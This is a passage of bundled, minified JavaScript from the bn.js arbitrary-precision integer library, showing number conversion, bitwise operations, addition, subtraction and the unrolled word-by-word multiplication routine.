                        var groupSize = groupSizes[base],
                            groupBase = groupBases[base];
                        out = "";
                        var c = this.clone();
                        for (c.negative = 0; !c.isZero(); ) {
                            var r = c.modrn(groupBase).toString(base);
                            out = (c = c.idivn(groupBase)).isZero() ? r + out : zeros[groupSize - r.length] + r + out;
                        }
                        for (this.isZero() && (out = "0" + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    assert(!1, "Base should be between 2 and 36");
                }),
                    (BN.prototype.toNumber = function () {
                        var ret = this.words[0];
                        return (
                            2 === this.length
                                ? (ret += 67108864 * this.words[1])
                                : 3 === this.length && 1 === this.words[2]
                                ? (ret += 4503599627370496 + 67108864 * this.words[1])
                                : this.length > 2 && assert(!1, "Number can only safely store up to 53 bits"),
                            0 !== this.negative ? -ret : ret
                        );
                    }),
                    (BN.prototype.toJSON = function () {
                        return this.toString(16, 2);
                    }),
                    Buffer &&
                        (BN.prototype.toBuffer = function (endian, length) {
                            return this.toArrayLike(Buffer, endian, length);
                        }),
                    (BN.prototype.toArray = function (endian, length) {
                        return this.toArrayLike(Array, endian, length);
                    });
                function smallMulTo(self, num, out) {
                    out.negative = num.negative ^ self.negative;
                    var len = (self.length + num.length) | 0;
                    (out.length = len), (len = (len - 1) | 0);
                    var a = 0 | self.words[0],
                        b = 0 | num.words[0],
                        r = a * b,
                        lo = 67108863 & r,
                        carry = (r / 67108864) | 0;
                    out.words[0] = lo;
                    for (var k = 1; k < len; k++) {
                        for (var ncarry = carry >>> 26, rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                            var i = (k - j) | 0;
                            (ncarry += ((r = (a = 0 | self.words[i]) * (b = 0 | num.words[j]) + rword) / 67108864) | 0), (rword = 67108863 & r);
                        }
                        (out.words[k] = 0 | rword), (carry = 0 | ncarry);
                    }
                    return 0 !== carry ? (out.words[k] = 0 | carry) : out.length--, out._strip();
                }
                (BN.prototype.toArrayLike = function (ArrayType, endian, length) {
                    this._strip();
                    var byteLength = this.byteLength(),
                        reqLength = length || Math.max(1, byteLength);
                    assert(byteLength <= reqLength, "byte array longer than desired length"), assert(reqLength > 0, "Requested array length <= 0");
                    var res = (function (ArrayType, size) {
                        return ArrayType.allocUnsafe ? ArrayType.allocUnsafe(size) : new ArrayType(size);
                    })(ArrayType, reqLength);
                    return this["_toArrayLike" + ("le" === endian ? "LE" : "BE")](res, byteLength), res;
                }),
                    (BN.prototype._toArrayLikeLE = function (res, byteLength) {
                        for (var position = 0, carry = 0, i = 0, shift = 0; i < this.length; i++) {
                            var word = (this.words[i] << shift) | carry;
                            (res[position++] = 255 & word),
                                position < res.length && (res[position++] = (word >> 8) & 255),
                                position < res.length && (res[position++] = (word >> 16) & 255),
                                6 === shift ? (position < res.length && (res[position++] = (word >> 24) & 255), (carry = 0), (shift = 0)) : ((carry = word >>> 24), (shift += 2));
                        }
                        if (position < res.length) for (res[position++] = carry; position < res.length; ) res[position++] = 0;
                    }),
                    (BN.prototype._toArrayLikeBE = function (res, byteLength) {
                        for (var position = res.length - 1, carry = 0, i = 0, shift = 0; i < this.length; i++) {
                            var word = (this.words[i] << shift) | carry;
                            (res[position--] = 255 & word),
                                position >= 0 && (res[position--] = (word >> 8) & 255),
                                position >= 0 && (res[position--] = (word >> 16) & 255),
                                6 === shift ? (position >= 0 && (res[position--] = (word >> 24) & 255), (carry = 0), (shift = 0)) : ((carry = word >>> 24), (shift += 2));
                        }
                        if (position >= 0) for (res[position--] = carry; position >= 0; ) res[position--] = 0;
                    }),
                    Math.clz32
                        ? (BN.prototype._countBits = function (w) {
                              return 32 - Math.clz32(w);
                          })
                        : (BN.prototype._countBits = function (w) {
                              var t = w,
                                  r = 0;
                              return t >= 4096 && ((r += 13), (t >>>= 13)), t >= 64 && ((r += 7), (t >>>= 7)), t >= 8 && ((r += 4), (t >>>= 4)), t >= 2 && ((r += 2), (t >>>= 2)), r + t;
                          }),
                    (BN.prototype._zeroBits = function (w) {
                        if (0 === w) return 26;
                        var t = w,
                            r = 0;
                        return 0 == (8191 & t) && ((r += 13), (t >>>= 13)), 0 == (127 & t) && ((r += 7), (t >>>= 7)), 0 == (15 & t) && ((r += 4), (t >>>= 4)), 0 == (3 & t) && ((r += 2), (t >>>= 2)), 0 == (1 & t) && r++, r;
                    }),
                    (BN.prototype.bitLength = function () {
                        var w = this.words[this.length - 1],
                            hi = this._countBits(w);
                        return 26 * (this.length - 1) + hi;
                    }),
                    (BN.prototype.zeroBits = function () {
                        if (this.isZero()) return 0;
                        for (var r = 0, i = 0; i < this.length; i++) {
                            var b = this._zeroBits(this.words[i]);
                            if (((r += b), 26 !== b)) break;
                        }
                        return r;
                    }),
                    (BN.prototype.byteLength = function () {
                        return Math.ceil(this.bitLength() / 8);
                    }),
                    (BN.prototype.toTwos = function (width) {
                        return 0 !== this.negative ? this.abs().inotn(width).iaddn(1) : this.clone();
                    }),
                    (BN.prototype.fromTwos = function (width) {
                        return this.testn(width - 1) ? this.notn(width).iaddn(1).ineg() : this.clone();
                    }),
                    (BN.prototype.isNeg = function () {
                        return 0 !== this.negative;
                    }),
                    (BN.prototype.neg = function () {
                        return this.clone().ineg();
                    }),
                    (BN.prototype.ineg = function () {
                        return this.isZero() || (this.negative ^= 1), this;
                    }),
                    (BN.prototype.iuor = function (num) {
                        for (; this.length < num.length; ) this.words[this.length++] = 0;
                        for (var i = 0; i < num.length; i++) this.words[i] = this.words[i] | num.words[i];
                        return this._strip();
                    }),
                    (BN.prototype.ior = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuor(num);
                    }),
                    (BN.prototype.or = function (num) {
                        return this.length > num.length ? this.clone().ior(num) : num.clone().ior(this);
                    }),
                    (BN.prototype.uor = function (num) {
                        return this.length > num.length ? this.clone().iuor(num) : num.clone().iuor(this);
                    }),
                    (BN.prototype.iuand = function (num) {
                        var b;
                        b = this.length > num.length ? num : this;
                        for (var i = 0; i < b.length; i++) this.words[i] = this.words[i] & num.words[i];
                        return (this.length = b.length), this._strip();
                    }),
                    (BN.prototype.iand = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuand(num);
                    }),
                    (BN.prototype.and = function (num) {
                        return this.length > num.length ? this.clone().iand(num) : num.clone().iand(this);
                    }),
                    (BN.prototype.uand = function (num) {
                        return this.length > num.length ? this.clone().iuand(num) : num.clone().iuand(this);
                    }),
                    (BN.prototype.iuxor = function (num) {
                        var a, b;
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var i = 0; i < b.length; i++) this.words[i] = a.words[i] ^ b.words[i];
                        if (this !== a) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = a.length), this._strip();
                    }),
                    (BN.prototype.ixor = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuxor(num);
                    }),
                    (BN.prototype.xor = function (num) {
                        return this.length > num.length ? this.clone().ixor(num) : num.clone().ixor(this);
                    }),
                    (BN.prototype.uxor = function (num) {
                        return this.length > num.length ? this.clone().iuxor(num) : num.clone().iuxor(this);
                    }),
                    (BN.prototype.inotn = function (width) {
                        assert("number" == typeof width && width >= 0);
                        var bytesNeeded = 0 | Math.ceil(width / 26),
                            bitsLeft = width % 26;
                        this._expand(bytesNeeded), bitsLeft > 0 && bytesNeeded--;
                        for (var i = 0; i < bytesNeeded; i++) this.words[i] = 67108863 & ~this.words[i];
                        return bitsLeft > 0 && (this.words[i] = ~this.words[i] & (67108863 >> (26 - bitsLeft))), this._strip();
                    }),
                    (BN.prototype.notn = function (width) {
                        return this.clone().inotn(width);
                    }),
                    (BN.prototype.setn = function (bit, val) {
                        assert("number" == typeof bit && bit >= 0);
                        var off = (bit / 26) | 0,
                            wbit = bit % 26;
                        return this._expand(off + 1), (this.words[off] = val ? this.words[off] | (1 << wbit) : this.words[off] & ~(1 << wbit)), this._strip();
                    }),
                    (BN.prototype.iadd = function (num) {
                        var r, a, b;
                        if (0 !== this.negative && 0 === num.negative) return (this.negative = 0), (r = this.isub(num)), (this.negative ^= 1), this._normSign();
                        if (0 === this.negative && 0 !== num.negative) return (num.negative = 0), (r = this.isub(num)), (num.negative = 1), r._normSign();
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (r = (0 | a.words[i]) + (0 | b.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        for (; 0 !== carry && i < a.length; i++) (r = (0 | a.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        if (((this.length = a.length), 0 !== carry)) (this.words[this.length] = carry), this.length++;
                        else if (a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return this;
                    }),
                    (BN.prototype.add = function (num) {
                        var res;
                        return 0 !== num.negative && 0 === this.negative
                            ? ((num.negative = 0), (res = this.sub(num)), (num.negative ^= 1), res)
                            : 0 === num.negative && 0 !== this.negative
                            ? ((this.negative = 0), (res = num.sub(this)), (this.negative = 1), res)
                            : this.length > num.length
                            ? this.clone().iadd(num)
                            : num.clone().iadd(this);
                    }),
                    (BN.prototype.isub = function (num) {
                        if (0 !== num.negative) {
                            num.negative = 0;
                            var r = this.iadd(num);
                            return (num.negative = 1), r._normSign();
                        }
                        if (0 !== this.negative) return (this.negative = 0), this.iadd(num), (this.negative = 1), this._normSign();
                        var a,
                            b,
                            cmp = this.cmp(num);
                        if (0 === cmp) return (this.negative = 0), (this.length = 1), (this.words[0] = 0), this;
                        cmp > 0 ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (carry = (r = (0 | a.words[i]) - (0 | b.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        for (; 0 !== carry && i < a.length; i++) (carry = (r = (0 | a.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        if (0 === carry && i < a.length && a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = Math.max(this.length, i)), a !== this && (this.negative = 1), this._strip();
                    }),
                    (BN.prototype.sub = function (num) {
                        return this.clone().isub(num);
                    });
                var comb10MulTo = function (self, num, out) {
                    var lo,
                        mid,
                        hi,
                        a = self.words,
                        b = num.words,
                        o = out.words,
                        c = 0,
                        a0 = 0 | a[0],
                        al0 = 8191 & a0,
                        ah0 = a0 >>> 13,
                        a1 = 0 | a[1],
                        al1 = 8191 & a1,
                        ah1 = a1 >>> 13,
                        a2 = 0 | a[2],
                        al2 = 8191 & a2,
                        ah2 = a2 >>> 13,
                        a3 = 0 | a[3],
                        al3 = 8191 & a3,
                        ah3 = a3 >>> 13,
                        a4 = 0 | a[4],
                        al4 = 8191 & a4,
                        ah4 = a4 >>> 13,
                        a5 = 0 | a[5],
                        al5 = 8191 & a5,
                        ah5 = a5 >>> 13,
                        a6 = 0 | a[6],
                        al6 = 8191 & a6,
                        ah6 = a6 >>> 13,
                        a7 = 0 | a[7],
                        al7 = 8191 & a7,
                        ah7 = a7 >>> 13,
                        a8 = 0 | a[8],
                        al8 = 8191 & a8,
                        ah8 = a8 >>> 13,
                        a9 = 0 | a[9],
                        al9 = 8191 & a9,
                        ah9 = a9 >>> 13,
                        b0 = 0 | b[0],
                        bl0 = 8191 & b0,
                        bh0 = b0 >>> 13,
                        b1 = 0 | b[1],
                        bl1 = 8191 & b1,
                        bh1 = b1 >>> 13,
                        b2 = 0 | b[2],
                        bl2 = 8191 & b2,
                        bh2 = b2 >>> 13,
                        b3 = 0 | b[3],
                        bl3 = 8191 & b3,
                        bh3 = b3 >>> 13,
                        b4 = 0 | b[4],
                        bl4 = 8191 & b4,
                        bh4 = b4 >>> 13,
                        b5 = 0 | b[5],
                        bl5 = 8191 & b5,
                        bh5 = b5 >>> 13,
                        b6 = 0 | b[6],
                        bl6 = 8191 & b6,
                        bh6 = b6 >>> 13,
                        b7 = 0 | b[7],
                        bl7 = 8191 & b7,
                        bh7 = b7 >>> 13,
                        b8 = 0 | b[8],
                        bl8 = 8191 & b8,
                        bh8 = b8 >>> 13,
                        b9 = 0 | b[9],
                        bl9 = 8191 & b9,
                        bh9 = b9 >>> 13;
                    (out.negative = self.negative ^ num.negative), (out.length = 19);
                    var w0 = (((c + (lo = Math.imul(al0, bl0))) | 0) + ((8191 & (mid = ((mid = Math.imul(al0, bh0)) + Math.imul(ah0, bl0)) | 0)) << 13)) | 0;
                    (c = ((((hi = Math.imul(ah0, bh0)) + (mid >>> 13)) | 0) + (w0 >>> 26)) | 0), (w0 &= 67108863), (lo = Math.imul(al1, bl0)), (mid = ((mid = Math.imul(al1, bh0)) + Math.imul(ah1, bl0)) | 0), (hi = Math.imul(ah1, bh0));
                    var w1 = (((c + (lo = (lo + Math.imul(al0, bl1)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh1)) | 0) + Math.imul(ah0, bl1)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh1)) | 0) + (mid >>> 13)) | 0) + (w1 >>> 26)) | 0),
                        (w1 &= 67108863),
                        (lo = Math.imul(al2, bl0)),
                        (mid = ((mid = Math.imul(al2, bh0)) + Math.imul(ah2, bl0)) | 0),
                        (hi = Math.imul(ah2, bh0)),
                        (lo = (lo + Math.imul(al1, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh1)) | 0) + Math.imul(ah1, bl1)) | 0),
                        (hi = (hi + Math.imul(ah1, bh1)) | 0);
                    var w2 = (((c + (lo = (lo + Math.imul(al0, bl2)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh2)) | 0) + Math.imul(ah0, bl2)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh2)) | 0) + (mid >>> 13)) | 0) + (w2 >>> 26)) | 0),
                        (w2 &= 67108863),
                        (lo = Math.imul(al3, bl0)),
                        (mid = ((mid = Math.imul(al3, bh0)) + Math.imul(ah3, bl0)) | 0),
                        (hi = Math.imul(ah3, bh0)),
                        (lo = (lo + Math.imul(al2, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh1)) | 0) + Math.imul(ah2, bl1)) | 0),
                        (hi = (hi + Math.imul(ah2, bh1)) | 0),
                        (lo = (lo + Math.imul(al1, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh2)) | 0) + Math.imul(ah1, bl2)) | 0),
                        (hi = (hi + Math.imul(ah1, bh2)) | 0);
                    var w3 = (((c + (lo = (lo + Math.imul(al0, bl3)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh3)) | 0) + Math.imul(ah0, bl3)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh3)) | 0) + (mid >>> 13)) | 0) + (w3 >>> 26)) | 0),
                        (w3 &= 67108863),
                        (lo = Math.imul(al4, bl0)),
                        (mid = ((mid = Math.imul(al4, bh0)) + Math.imul(ah4, bl0)) | 0),
                        (hi = Math.imul(ah4, bh0)),
                        (lo = (lo + Math.imul(al3, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh1)) | 0) + Math.imul(ah3, bl1)) | 0),
                        (hi = (hi + Math.imul(ah3, bh1)) | 0),
                        (lo = (lo + Math.imul(al2, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh2)) | 0) + Math.imul(ah2, bl2)) | 0),
                        (hi = (hi + Math.imul(ah2, bh2)) | 0),
                        (lo = (lo + Math.imul(al1, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh3)) | 0) + Math.imul(ah1, bl3)) | 0),
                        (hi = (hi + Math.imul(ah1, bh3)) | 0);
                    var w4 = (((c + (lo = (lo + Math.imul(al0, bl4)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh4)) | 0) + Math.imul(ah0, bl4)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh4)) | 0) + (mid >>> 13)) | 0) + (w4 >>> 26)) | 0),
                        (w4 &= 67108863),
                        (lo = Math.imul(al5, bl0)),
                        (mid = ((mid = Math.imul(al5, bh0)) + Math.imul(ah5, bl0)) | 0),
                        (hi = Math.imul(ah5, bh0)),
                        (lo = (lo + Math.imul(al4, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh1)) | 0) + Math.imul(ah4, bl1)) | 0),
                        (hi = (hi + Math.imul(ah4, bh1)) | 0),
                        (lo = (lo + Math.imul(al3, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh2)) | 0) + Math.imul(ah3, bl2)) | 0),
                        (hi = (hi + Math.imul(ah3, bh2)) | 0),
                        (lo = (lo + Math.imul(al2, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh3)) | 0) + Math.imul(ah2, bl3)) | 0),
                        (hi = (hi + Math.imul(ah2, bh3)) | 0),
                        (lo = (lo + Math.imul(al1, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh4)) | 0) + Math.imul(ah1, bl4)) | 0),
                        (hi = (hi + Math.imul(ah1, bh4)) | 0);
                    var w5 = (((c + (lo = (lo + Math.imul(al0, bl5)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh5)) | 0) + Math.imul(ah0, bl5)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh5)) | 0) + (mid >>> 13)) | 0) + (w5 >>> 26)) | 0),
                        (w5 &= 67108863),
                        (lo = Math.imul(al6, bl0)),
                        (mid = ((mid = Math.imul(al6, bh0)) + Math.imul(ah6, bl0)) | 0),
                        (hi = Math.imul(ah6, bh0)),
                        (lo = (lo + Math.imul(al5, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh1)) | 0) + Math.imul(ah5, bl1)) | 0),
                        (hi = (hi + Math.imul(ah5, bh1)) | 0),
                        (lo = (lo + Math.imul(al4, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh2)) | 0) + Math.imul(ah4, bl2)) | 0),
                        (hi = (hi + Math.imul(ah4, bh2)) | 0),
                        (lo = (lo + Math.imul(al3, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh3)) | 0) + Math.imul(ah3, bl3)) | 0),
                        (hi = (hi + Math.imul(ah3, bh3)) | 0),
                        (lo = (lo + Math.imul(al2, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh4)) | 0) + Math.imul(ah2, bl4)) | 0),
                        (hi = (hi + Math.imul(ah2, bh4)) | 0),
                        (lo = (lo + Math.imul(al1, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh5)) | 0) + Math.imul(ah1, bl5)) | 0),
                        (hi = (hi + Math.imul(ah1, bh5)) | 0);
                    var w6 = (((c + (lo = (lo + Math.imul(al0, bl6)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh6)) | 0) + Math.imul(ah0, bl6)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh6)) | 0) + (mid >>> 13)) | 0) + (w6 >>> 26)) | 0),
                        (w6 &= 67108863),
                        (lo = Math.imul(al7, bl0)),
                        (mid = ((mid = Math.imul(al7, bh0)) + Math.imul(ah7, bl0)) | 0),
                        (hi = Math.imul(ah7, bh0)),
                        (lo = (lo + Math.imul(al6, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh1)) | 0) + Math.imul(ah6, bl1)) | 0),
                        (hi = (hi + Math.imul(ah6, bh1)) | 0),
                        (lo = (lo + Math.imul(al5, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh2)) | 0) + Math.imul(ah5, bl2)) | 0),
                        (hi = (hi + Math.imul(ah5, bh2)) | 0),
                        (lo = (lo + Math.imul(al4, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh3)) | 0) + Math.imul(ah4, bl3)) | 0),
                        (hi = (hi + Math.imul(ah4, bh3)) | 0),
                        (lo = (lo + Math.imul(al3, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh4)) | 0) + Math.imul(ah3, bl4)) | 0),
                        (hi = (hi + Math.imul(ah3, bh4)) | 0),
                        (lo = (lo + Math.imul(al2, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh5)) | 0) + Math.imul(ah2, bl5)) | 0),
                        (hi = (hi + Math.imul(ah2, bh5)) | 0),
                        (lo = (lo + Math.imul(al1, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh6)) | 0) + Math.imul(ah1, bl6)) | 0),
                        (hi = (hi + Math.imul(ah1, bh6)) | 0);
                    var w7 = (((c + (lo = (lo + Math.imul(al0, bl7)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh7)) | 0) + Math.imul(ah0, bl7)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh7)) | 0) + (mid >>> 13)) | 0) + (w7 >>> 26)) | 0),
                        (w7 &= 67108863),
                        (lo = Math.imul(al8, bl0)),
                        (mid = ((mid = Math.imul(al8, bh0)) + Math.imul(ah8, bl0)) | 0),
                        (hi = Math.imul(ah8, bh0)),
                        (lo = (lo + Math.imul(al7, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh1)) | 0) + Math.imul(ah7, bl1)) | 0),
                        (hi = (hi + Math.imul(ah7, bh1)) | 0),
                        (lo = (lo + Math.imul(al6, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh2)) | 0) + Math.imul(ah6, bl2)) | 0),
                        (hi = (hi + Math.imul(ah6, bh2)) | 0),
                        (lo = (lo + Math.imul(al5, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh3)) | 0) + Math.imul(ah5, bl3)) | 0),
                        (hi = (hi + Math.imul(ah5, bh3)) | 0),
                        (lo = (lo + Math.imul(al4, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh4)) | 0) + Math.imul(ah4, bl4)) | 0),
                        (hi = (hi + Math.imul(ah4, bh4)) | 0),
                        (lo = (lo + Math.imul(al3, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh5)) | 0) + Math.imul(ah3, bl5)) | 0),
                        (hi = (hi + Math.imul(ah3, bh5)) | 0),
                        (lo = (lo + Math.imul(al2, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh6)) | 0) + Math.imul(ah2, bl6)) | 0),
                        (hi = (hi + Math.imul(ah2, bh6)) | 0),
                        (lo = (lo + Math.imul(al1, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh7)) | 0) + Math.imul(ah1, bl7)) | 0),
                        (hi = (hi + Math.imul(ah1, bh7)) | 0);
                    var w8 = (((c + (lo = (lo + Math.imul(al0, bl8)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh8)) | 0) + Math.imul(ah0, bl8)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh8)) | 0) + (mid >>> 13)) | 0) + (w8 >>> 26)) | 0),
                        (w8 &= 67108863),
                        (lo = Math.imul(al9, bl0)),
                        (mid = ((mid = Math.imul(al9, bh0)) + Math.imul(ah9, bl0)) | 0),
                        (hi = Math.imul(ah9, bh0)),
                        (lo = (lo + Math.imul(al8, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh1)) | 0) + Math.imul(ah8, bl1)) | 0),
                        (hi = (hi + Math.imul(ah8, bh1)) | 0),
                        (lo = (lo + Math.imul(al7, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh2)) | 0) + Math.imul(ah7, bl2)) | 0),
                        (hi = (hi + Math.imul(ah7, bh2)) | 0),
                        (lo = (lo + Math.imul(al6, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh3)) | 0) + Math.imul(ah6, bl3)) | 0),
                        (hi = (hi + Math.imul(ah6, bh3)) | 0),
                        (lo = (lo + Math.imul(al5, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh4)) | 0) + Math.imul(ah5, bl4)) | 0),
                        (hi = (hi + Math.imul(ah5, bh4)) | 0),
                        (lo = (lo + Math.imul(al4, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh5)) | 0) + Math.imul(ah4, bl5)) | 0),
                        (hi = (hi + Math.imul(ah4, bh5)) | 0),
                        (lo = (lo + Math.imul(al3, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh6)) | 0) + Math.imul(ah3, bl6)) | 0),
                        (hi = (hi + Math.imul(ah3, bh6)) | 0),
                        (lo = (lo + Math.imul(al2, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh7)) | 0) + Math.imul(ah2, bl7)) | 0),
                        (hi = (hi + Math.imul(ah2, bh7)) | 0),
                        (lo = (lo + Math.imul(al1, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh8)) | 0) + Math.imul(ah1, bl8)) | 0),
                        (hi = (hi + Math.imul(ah1, bh8)) | 0);
                    var w9 = (((c + (lo = (lo + Math.imul(al0, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh9)) | 0) + Math.imul(ah0, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh9)) | 0) + (mid >>> 13)) | 0) + (w9 >>> 26)) | 0),
                        (w9 &= 67108863),
                        (lo = Math.imul(al9, bl1)),
                        (mid = ((mid = Math.imul(al9, bh1)) + Math.imul(ah9, bl1)) | 0),
                        (hi = Math.imul(ah9, bh1)),
                        (lo = (lo + Math.imul(al8, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh2)) | 0) + Math.imul(ah8, bl2)) | 0),
                        (hi = (hi + Math.imul(ah8, bh2)) | 0),
                        (lo = (lo + Math.imul(al7, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh3)) | 0) + Math.imul(ah7, bl3)) | 0),
                        (hi = (hi + Math.imul(ah7, bh3)) | 0),
                        (lo = (lo + Math.imul(al6, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh4)) | 0) + Math.imul(ah6, bl4)) | 0),
                        (hi = (hi + Math.imul(ah6, bh4)) | 0),
                        (lo = (lo + Math.imul(al5, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh5)) | 0) + Math.imul(ah5, bl5)) | 0),
                        (hi = (hi + Math.imul(ah5, bh5)) | 0),
                        (lo = (lo + Math.imul(al4, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh6)) | 0) + Math.imul(ah4, bl6)) | 0),
                        (hi = (hi + Math.imul(ah4, bh6)) | 0),
                        (lo = (lo + Math.imul(al3, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh7)) | 0) + Math.imul(ah3, bl7)) | 0),
                        (hi = (hi + Math.imul(ah3, bh7)) | 0),
                        (lo = (lo + Math.imul(al2, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh8)) | 0) + Math.imul(ah2, bl8)) | 0),
                        (hi = (hi + Math.imul(ah2, bh8)) | 0);
                    var w10 = (((c + (lo = (lo + Math.imul(al1, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al1, bh9)) | 0) + Math.imul(ah1, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah1, bh9)) | 0) + (mid >>> 13)) | 0) + (w10 >>> 26)) | 0),
                        (w10 &= 67108863),
                        (lo = Math.imul(al9, bl2)),
                        (mid = ((mid = Math.imul(al9, bh2)) + Math.imul(ah9, bl2)) | 0),
                        (hi = Math.imul(ah9, bh2)),
                        (lo = (lo + Math.imul(al8, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh3)) | 0) + Math.imul(ah8, bl3)) | 0),
                        (hi = (hi + Math.imul(ah8, bh3)) | 0),
                        (lo = (lo + Math.imul(al7, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh4)) | 0) + Math.imul(ah7, bl4)) | 0),
                        (hi = (hi + Math.imul(ah7, bh4)) | 0),
                        (lo = (lo + Math.imul(al6, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh5)) | 0) + Math.imul(ah6, bl5)) | 0),
                        (hi = (hi + Math.imul(ah6, bh5)) | 0),
                        (lo = (lo + Math.imul(al5, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh6)) | 0) + Math.imul(ah5, bl6)) | 0),
                        (hi = (hi + Math.imul(ah5, bh6)) | 0),
                        (lo = (lo + Math.imul(al4, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh7)) | 0) + Math.imul(ah4, bl7)) | 0),
                        (hi = (hi + Math.imul(ah4, bh7)) | 0),
                        (lo = (lo + Math.imul(al3, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh8)) | 0) + Math.imul(ah3, bl8)) | 0),
                        (hi = (hi + Math.imul(ah3, bh8)) | 0);
                    var w11 = (((c + (lo = (lo + Math.imul(al2, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al2, bh9)) | 0) + Math.imul(ah2, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah2, bh9)) | 0) + (mid >>> 13)) | 0) + (w11 >>> 26)) | 0),
                        (w11 &= 67108863),
                        (lo = Math.imul(al9, bl3)),
